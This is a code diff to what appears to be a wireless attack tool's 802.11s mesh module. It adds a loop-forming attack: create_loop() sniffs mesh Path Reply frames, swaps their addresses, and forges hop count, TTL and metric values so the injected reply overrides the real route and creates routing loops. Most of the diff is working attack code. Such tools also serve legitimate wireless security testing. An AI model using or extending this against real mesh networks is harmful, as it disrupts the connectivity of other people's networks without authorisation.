@@ -54,6 +54,8 @@ void ieee80211s_longhelp()
 	  "      -p <impersonated_meshpoint>\n"
 	  "         Path Request Flooding using the impersonated_meshpoint's adress\n"
 	  "         Adjust the speed switch (-s) for maximum profit!\n"
+	  "      -l\n"
+	  "         Just create loops on every route found by modifying Path Replies\n"
 	  "      -s <pps>\n"
 	  "         Set speed in packets per second (Default: 100)\n"
 	  "      -n <meshID>\n"
@@ -69,7 +71,7 @@ void *ieee80211s_parse(int argc, char *argv[]) {
   dopt->speed = 100;
   dopt->target = NULL;
   
-  while ((opt = getopt(argc, argv, "n:f:s:b:p:")) != -1) {
+  while ((opt = getopt(argc, argv, "n:f:s:b:p:l")) != -1) {
     switch (opt) {
       case 'f':
 	if (dopt->attack_type) { printf("Duplicate Attack type: Fuzzing\n"); return NULL; }
@@ -92,7 +94,11 @@ void *ieee80211s_parse(int argc, char *argv[]) {
 	dopt->target = malloc(sizeof(struct ether_addr));
 	*(dopt->target) = parse_mac(optarg);
 	dopt->attack_type = 'p';
-      break;      
+      break;
+      case 'l':
+	if (dopt->attack_type) { printf("Duplicate Attack type: Loop Forming\n"); return NULL; }
+	dopt->attack_type = 'l';
+      break;
       case 's':
 	dopt->speed = (unsigned int) atoi(optarg);
       break;
@@ -317,20 +323,6 @@ struct packet do_flood(struct ieee80211s_options *dopt) {
   
   preq = (struct mesh_preq *) (inject.data + sizeof(struct ieee_hdr) + sizeof(struct action_fixed));
   inject.len += sizeof(struct mesh_preq);
-/*struct mesh_preq {
-  uint8_t flags;
-  uint8_t hop_count;
-  uint8_t ttl;
-  uint32_t discovery_id;
-  struct ether_addr originator;
-  uint32_t orig_seq;
-  uint32_t lifetime;
-  uint32_t metric;
-  uint8_t target_count;
-  uint8_t target_flags;
-  struct ether_addr target;
-  uint32_t target_seq;
-} __attribute__((packed));*/
   preq->flags = 0x00;
   preq->hop_count = hops;
   preq->ttl = 31 - hops;
@@ -345,6 +337,42 @@ struct packet do_flood(struct ieee80211s_options *dopt) {
   preq->target_seq = tseq;
   
   return inject;
+}
+
+struct packet create_loop(struct ieee80211s_options *dopt) {
+  dopt = dopt; //We dont care about options yet
+  struct packet sniff;
+  struct ieee_hdr *hdr;
+  struct action_fixed *act;
+  struct mesh_prep *prep;
+  
+  while(1) {
+    sniff = osdep_read_packet();
+    hdr = (struct ieee_hdr *) sniff.data;
+    if (hdr->type == IEEE80211_TYPE_ACTION) {
+      act = (struct action_fixed *) (sniff.data + sizeof(struct ieee_hdr));
+      if ((act->category == MESH_ACTION_CATEGORY) && (act->action_code == MESH_ACTION_PATHSEL) && (act->tag == MESH_TAG_PREP)) {
+	prep = (struct mesh_prep *) (sniff.data + sizeof(struct ieee_hdr) + sizeof(struct action_fixed));
+	if (prep->metric == 1) continue; //skip injected packets
+	break;
+      }
+    }
+  }
+
+  //Swap Adresses to point packet back the initial route
+  hdr->addr3 = hdr->addr1; //dst to bssid
+  hdr->addr1 = hdr->addr2; //src to dst
+  hdr->addr2 = hdr->addr3; //bssid to src
+  
+  MAC_COPY(info_dst, prep->target);
+  MAC_COPY(info_src, prep->originator);
+  
+  //Fix values to make injected packet be newer and better than old route
+  prep->hop_count = 1;
+  prep->ttl = 30;
+  prep->metric = 1;
+  
+  return sniff;
 }
 
 struct packet ieee80211s_getpacket(void *options) {
@@ -362,6 +390,9 @@ struct packet ieee80211s_getpacket(void *options) {
     break;
     case 'p':
       pkt = do_flood(dopt);
+    break;
+    case 'l':
+      pkt = create_loop(dopt);
     break;
     default:
       printf("BUG! Unknown attack type %c\n", dopt->attack_type);
@@ -384,6 +415,13 @@ void ieee80211s_stats(void *options) {
       printf(" searching for ");
       print_mac(info_dst);
       printf(": %s\n", blackhole_info);
+    break;
+    case 'l':
+      printf("\rLoops created on route between ");
+      print_mac(info_src);
+      printf(" and ");
+      print_mac(info_dst);
+      printf(".                      \n");
     break;
   }
 }
